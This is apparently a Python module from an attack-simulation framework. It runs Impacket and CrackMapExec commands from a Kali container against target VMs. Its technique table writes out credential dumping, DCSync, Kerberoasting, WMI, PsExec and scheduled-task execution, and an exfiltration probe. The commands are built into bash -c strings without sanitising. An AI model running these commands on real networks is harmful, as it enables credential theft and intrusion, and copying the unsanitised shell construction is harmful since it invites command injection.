"""Kali Linux execution bridge — runs Impacket/CrackMapExec via Docker exec.

Executes real attack tools from a Kali Docker container against target VMs.
Impacket alone covers 7 of 14 engine techniques.

Requirements:
- goalcert-kali Docker container running
- Impacket + CrackMapExec installed in the container
"""
from __future__ import annotations

import subprocess
import time

from ..catalog.spec import TechniqueSpec
from ..world import AssetInstance
from .base import ExecutionBridge, ExecutionResult, VMBinding

# Engine technique key → Kali command template
# Placeholders: {host}, {user}, {password}, {domain}
TECHNIQUE_KALI: dict[str, dict] = {
    "lsass_dump": {
        "tool": "impacket-secretsdump",
        "command": "impacket-secretsdump {domain}/{user}:{password}@{host}",
        "description": "Dump LSASS credentials via DRSUAPI",
    },
    "kerberoast": {
        "tool": "impacket-GetUserSPNs",
        "command": "impacket-GetUserSPNs -request -dc-ip {host} {domain}/{user}:{password}",
        "description": "Request TGS tickets for offline cracking",
    },
    "dcsync": {
        "tool": "impacket-secretsdump",
        "command": "impacket-secretsdump -just-dc {domain}/{user}:{password}@{host}",
        "description": "DCSync — replicate AD hashes via DRSUAPI",
    },
    "lateral_wmi": {
        "tool": "impacket-wmiexec",
        "command": 'impacket-wmiexec {domain}/{user}:{password}@{host} "whoami && hostname"',
        "description": "Remote execution via WMI",
    },
    "lateral_psexec": {
        "tool": "impacket-psexec",
        "command": 'impacket-psexec {domain}/{user}:{password}@{host} "whoami && hostname"',
        "description": "Remote execution via SMB service creation",
    },
    "persist_task": {
        "tool": "impacket-atexec",
        "command": 'impacket-atexec {domain}/{user}:{password}@{host} "cmd /c whoami"',
        "description": "Execute command via scheduled task",
    },
    "discovery_ad": {
        "tool": "crackmapexec",
        "command": "crackmapexec ldap {host} -u {user} -p {password} --users",
        "description": "Enumerate AD users via LDAP",
    },
    "exfil_http": {
        "tool": "curl",
        "command": 'curl -s -o /dev/null -w "%{{http_code}}" http://{host}:8080/test',
        "description": "Test HTTP exfiltration channel",
    },
    "lateral_rdp": {
        "tool": "nmap",
        "command": "nmap -p 3389 --open -Pn {host}",
        "description": "Check RDP port availability",
    },
}

KALI_CONTAINER = "goalcert-kali"


class KaliExecutionBridge(ExecutionBridge):
    """Execute attacks from a Kali Docker container using Impacket/CrackMapExec."""

    def __init__(self, container_name: str = KALI_CONTAINER):
        self.container = container_name

    def _docker_exec(self, command: str, timeout: int = 60) -> tuple[int, str, str]:
        """Run a command inside the Kali container. Returns (exit_code, stdout, stderr)."""
        result = subprocess.run(
            ["docker", "exec", self.container, "bash", "-c", command],
            capture_output=True, text=True, timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr

    async def execute(
        self,
        spec: TechniqueSpec,
        target: AssetInstance,
        vm: VMBinding,
    ) -> ExecutionResult:
        mapping = TECHNIQUE_KALI.get(spec.key)
        if not mapping:
            return ExecutionResult(
                success=False, technique_key=spec.key, mitre_id=spec.mitre,
                error=f"No Kali mapping for technique {spec.key}",
            )

        domain = vm.credential_ref or "WORKGROUP"
        command = mapping["command"].format(
            host=vm.host,
            user=vm.username,
            password=vm.password,
            domain=domain,
        )

        start = time.time()
        try:
            exit_code, stdout, stderr = self._docker_exec(command, timeout=120)
            duration_ms = int((time.time() - start) * 1000)

            output = stdout[:2000] if stdout else stderr[:2000]
            success = exit_code == 0 and len(stdout) > 10

            return ExecutionResult(
                success=success,
                technique_key=spec.key,
                mitre_id=spec.mitre,
                output=output,
                duration_ms=duration_ms,
                error=stderr[:500] if exit_code != 0 else None,
            )
        except subprocess.TimeoutExpired:
            return ExecutionResult(
                success=False, technique_key=spec.key, mitre_id=spec.mitre,
                error="Kali command timed out after 120s",
                duration_ms=120000,
            )
        except FileNotFoundError:
            return ExecutionResult(
                success=False, technique_key=spec.key, mitre_id=spec.mitre,
                error="Docker not available — cannot exec into Kali container",
            )

    async def health_check(self, vm: VMBinding) -> bool:
        try:
            code, out, _ = self._docker_exec("which impacket-secretsdump", timeout=10)
            return code == 0
        except Exception:
            return False

    async def cleanup(
        self,
        spec: TechniqueSpec,
        target: AssetInstance,
        vm: VMBinding,
    ) -> bool:
        return True
